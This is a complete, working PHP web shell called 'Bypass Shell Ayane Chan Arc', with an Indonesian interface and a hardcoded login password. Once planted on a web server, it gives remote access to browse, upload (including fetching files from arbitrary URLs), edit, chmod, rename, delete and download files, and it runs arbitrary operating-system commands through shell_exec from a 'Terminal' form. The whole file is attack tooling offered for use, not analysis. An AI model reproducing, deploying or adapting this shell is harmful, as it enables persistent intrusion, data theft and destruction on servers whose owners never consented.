<?php
session_start();

define('PASSWORD', 'ayane111'); // Password untuk kontrol akses

if (isset($_POST['password'])) {
    if ($_POST['password'] === PASSWORD) {
        $_SESSION['authenticated'] = true;
        echo '<audio autoplay><source src="https://c.top4top.io/m_3136q2v7f1.mp3" type="audio/mpeg"></audio>';
    } else {
        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
    }
}

if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function playAudio() {
    echo '<audio autoplay><source src="https://c.top4top.io/m_3136q2v7f1.mp3" type="audio/mpeg"></audio>';
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    echo '
<style>
        body {
            background-color: pink;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-card {
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 20px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            background-color: white;
        }
        .login-card img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .login-card h1 {
            margin-bottom: 20px;
            animation: colorChange 3s infinite;
        }
        @keyframes colorChange {
            0%, 100% {
                color: pink;
            }
            50% {
                color: lightblue;
            }
        }
        .login-card .form-group {
            margin-bottom: 15px;
        }
        .login-card .btn {
            width: 100%;
        }
    </style>
    <div class="login-card">
        <h1>Bypass Shell Ayane Chan Arc</h1>
        <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
        <form method="post">
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
        </div>
    </div>';
    exit;
}

function uploadFromUrl($url, $saveTo) {
    $fileContent = file_get_contents($url);
    if ($fileContent === FALSE) {
        die('Gagal mengunduh file dari URL');
    }
    file_put_contents($saveTo, $fileContent);
    playAudio();
    echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
}

function uploadFromForm($file, $saveTo) {
    if (move_uploaded_file($file['tmp_name'], $saveTo)) {
        playAudio();
        echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengupload file.</div>";
    }
}

function display_path_links($dir) {
    if (is_dir($dir)) {
        $folders = [];
        $files = [];

        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;

            if (is_dir($dir . '/' . $item)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }

        foreach ($folders as $folder) {
            $folderPath = htmlspecialchars($dir . '/' . $folder);
            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
            echo "<a href='?dir=" . urlencode($folderPath) . "' class='btn btn-link'>$folder/</a>";
            echo "<span class='ml-auto'>" . get_permissions($dir . '/' . $folder) . "</span>";
            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($dir . '/' . $folder)) . "</span>";
            echo "<button type='button' class='btn btn-warning btn-sm ml-2' data-toggle='modal' data-target='#renameModal' data-source='" . htmlspecialchars($dir . '/' . $folder) . "'>Ganti Nama</button>";
            echo "<button type='button' class='btn btn-secondary btn-sm ml-2' data-toggle='modal' data-target='#chmodModal' data-source='" . htmlspecialchars($dir . '/' . $folder) . "' data-permission='" . substr(sprintf('%o', fileperms($dir . '/' . $folder)), -4) . "'>Ubah Chmod</button>";
            echo "<button type='button' class='btn btn-danger btn-sm ml-2 delete-btn' data-path='" . htmlspecialchars($dir . '/' . $folder) . "'>Hapus</button>";
            echo "</div>";
        }

        foreach ($files as $file) {
            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
            echo "<span>$file</span>";
            echo "<span class='ml-auto'>" . get_permissions($dir . '/' . $file) . "</span>";
            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($dir . '/' . $file)) . "</span>";
            echo "<button type='button' class='btn btn-warning btn-sm ml-2' data-toggle='modal' data-target='#renameModal' data-source='" . htmlspecialchars($dir . '/' . $file) . "'>Ganti Nama</button>";
            echo "<button type='button' class='btn btn-secondary btn-sm ml-2' data-toggle='modal' data-target='#chmodModal' data-source='" . htmlspecialchars($dir . '/' . $file) . "' data-permission='" . substr(sprintf('%o', fileperms($dir . '/' . $file)), -4) . "'>Ubah Chmod</button>";
            echo "<button type='button' class='btn btn-primary btn-sm ml-2' data-toggle='modal' data-target='#editModal' data-source='" . htmlspecialchars($dir . '/' . $file) . "'>Edit</button>";
            echo "<button type='button' class='btn btn-danger btn-sm ml-2 delete-btn' data-path='" . htmlspecialchars($dir . '/' . $file) . "'>Hapus</button>";
            echo "<a href='?download=" . urlencode($dir . '/' . $file) . "' class='btn btn-info btn-sm ml-2'>Download</a>";
            echo "</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Direktori tidak ditemukan.</div>";
    }
}

function get_permissions($file) {
    $perms = fileperms($file);
    $info = '';

    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function deleteItem($path) {
    if (is_dir($path)) {
        rmdir($path);
    } else {
        unlink($path);
    }
    echo "<div class='alert alert-success'>Item berhasil dihapus.</div>";
}

function renameFile($source, $destination) {
    if (rename($source, $destination)) {
        echo "<div class='alert alert-success'>File berhasil diganti namanya.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengganti nama file.</div>";
    }
}

function changePermissions($path, $mode) {
    if (chmod($path, octdec($mode))) {
        echo "<div class='alert alert-success'>Chmod berhasil diubah.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengubah chmod.</div>";
    }
}

function editFile($path, $content) {
    if (file_put_contents($path, $content) !== false) {
        echo "<div class='alert alert-success'>File berhasil diedit.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengedit file.</div>";
    }
}

function executeCommand($command) {
    $output = shell_exec($command);
    return htmlspecialchars($output);
}

if (isset($_POST['url']) && isset($_POST['dir'])) {
    $url = $_POST['url'];
    $uploadDir = $_POST['dir'];
    $filename = basename($url);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromUrl($url, $savePath);
}

if (isset($_FILES['file']) && isset($_POST['dir'])) {
    $uploadDir = $_POST['dir'];
    $filename = basename($_FILES['file']['name']);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromForm($_FILES['file'], $savePath);
}

if (isset($_POST['delete']) && isset($_POST['path'])) {
    $path = $_POST['path'];
    deleteItem($path);
}

if (isset($_POST['rename']) && isset($_POST['source']) && isset($_POST['destination'])) {
    $source = $_POST['source'];
    $destination = $_POST['destination'];
    renameFile($source, $destination);
}

if (isset($_POST['chmod']) && isset($_POST['source']) && isset($_POST['mode'])) {
    $source = $_POST['source'];
    $mode = $_POST['mode'];
    changePermissions($source, $mode);
}

if (isset($_POST['edit']) && isset($_POST['source']) && isset($_POST['content'])) {
    $source = $_POST['source'];
    $content = $_POST['content'];
    editFile($source, $content);
}

if (isset($_POST['command']) && isset($_POST['dir'])) {
    $command = $_POST['command'];
    $dir = $_POST['dir'];
    chdir($dir);
    $commandOutput = executeCommand($command);
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$displayDir = realpath($dir);

$dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Shell Ayane Chan Arc</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<body style="background-color: pink;">
    <div class="container mt-5">
        <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
        <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
        <div class="text-center mb-4">
            <img src="https://i.pinimg.com/564x/b6/ac/db/b6acdba14a2632ae4bc67088ba0c0422.jpg" alt="Welcome Image" class="img-fluid">
        </div>
        <form method="post" class="text-center mb-4">
            <button type="submit" name="logout" class="btn btn-danger">Logout</button>
        </form>

        <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
        <form method="post">
            <div class="form-group">
                <label for="url">URL File</label>
                <input type="text" id="url" name="url" class="form-control" placeholder="Masukkan URL file" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
            <button type="submit" class="btn btn-primary">Upload dari URL</button>
        </form>
        
        <form method="post" enctype="multipart/form-data">
            <div class="form-group">
                <label for="file">Pilih File untuk Diupload</label>
                <input type="file" id="file" name="file" class="form-control" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
            <button type="submit" class="btn btn-primary">Upload File</button>
        </form>

        <h2 class="mt-4">Daftar Direktori</h2>
        <div class="alert alert-info">
            <strong>Direktori Saat Ini:</strong> 
            <?php
            $currentPath = '/';
            echo "<a href='?dir=' class='btn btn-link'>/</a> ";
            foreach ($dirArray as $index => $folder) {
                $currentPath .= htmlspecialchars($folder) . '/';
                $encodedPath = urlencode($currentPath);
                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
                if ($index < count($dirArray) - 1) {
                    echo " / ";
                }
            }
            ?>
        </div>
        <div class="list-group">
            <?php
            display_path_links($dir);
            ?>
        </div>

        <h2 class="mt-4">Terminal</h2>
        <form method="post">
            <div class="form-group">
                <label for="command">Command</label>
                <input type="text" id="command" name="command" class="form-control" placeholder="Masukkan perintah" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
            <button type="submit" class="btn btn-primary">Jalankan</button>
        </form>
        <?php if (isset($commandOutput)): ?>
            <pre class="mt-4"><?php echo $commandOutput; ?></pre>
        <?php endif; ?>

        <footer class="text-center mt-4">
            <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc. Semua hak cipta dilindungi.</small>
        </footer>

        <!-- Modal untuk rename file -->
        <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="renameModalLabel">Ganti Nama File</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <form method="post">
                        <div class="modal-body">
                            <input type="hidden" id="source" name="source">
                            <div class="form-group">
                                <label for="destination">Nama Baru</label>
                                <input type="text" id="destination" name="destination" class="form-control" placeholder="Masukkan nama baru" required>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
                            <button type="submit" name="rename" class="btn btn-primary">Ganti Nama</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- Modal untuk chmod file -->
        <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="chmodModalLabel">Ubah Chmod File</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <form method="post">
                        <div class="modal-body">
                            <input type="hidden" id="chmodSource" name="source">
                            <div class="form-group">
                                                                <label for="mode">Mode Chmod</label>
                                <input type="text" id="mode" name="mode" class="form-control" placeholder="Contoh: 0755" required>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
                            <button type="submit" name="chmod" class="btn btn-primary">Ubah Chmod</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <!-- Modal untuk edit file -->
        <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="editModalLabel">Edit File</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <form method="post">
                        <div class="modal-body">
                            <input type="hidden" id="editSource" name="source">
                            <div class="form-group">
                                <label for="content">Konten File</label>
                                <textarea id="content" name="content" class="form-control" rows="10" required></textarea>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
                            <button type="submit" name="edit" class="btn btn-primary">Simpan Perubahan</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <?php else: ?>
        <!-- Konten halaman login jika belum terautentikasi -->
        <?php endif; ?>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        $('#renameModal').on('show.bs.modal', function (event) {
            var button = $(event.relatedTarget) // Button that triggered the modal
            var source = button.data('source') // Extract info from data-* attributes
            var modal = $(this)
            modal.find('.modal-body #source').val(source)
        })

        $('#chmodModal').on('show.bs.modal', function (event) {
            var button = $(event.relatedTarget) // Button that triggered the modal
            var source = button.data('source') // Extract info from data-* attributes
            var permission = button.data('permission')
            var modal = $(this)
            modal.find('.modal-body #chmodSource').val(source)
            modal.find('.modal-body #mode').val(permission)
        })

        $('#editModal').on('show.bs.modal', function (event) {
            var button = $(event.relatedTarget) // Button that triggered the modal
            var source = button.data('source') // Extract info from data-* attributes
            var modal = $(this)
            modal.find('.modal-body #editSource').val(source)

            $.ajax({
                url: source,
                method: 'GET',
                success: function (data) {
                    modal.find('.modal-body #content').val(data)
                }
            })
        })

        $('.delete-btn').on('click', function (event) {
            var path = $(this).data('path');
            if (confirm('Apakah Anda yakin ingin menghapus ' + path + '?')) {
                $.post('', { delete: true, path: path }, function () {
                    location.reload();
                });
            }
        });
        
      document.addEventListener("DOMContentLoaded", function() {
    // Ensure that the login card is vertically and horizontally centered
    function centerLoginCard() {
        var loginCard = document.querySelector(".login-card");
        var windowHeight = window.innerHeight;
        var cardHeight = loginCard.offsetHeight;
        var marginTop = (windowHeight - cardHeight) / 2;

        loginCard.style.marginTop = marginTop + "px";
    }

    // Initial centering
    centerLoginCard();

    // Re-center on window resize
    window.addEventListener("resize", function() {
        centerLoginCard();
    });
});

    </script>
</body>
</html>
                              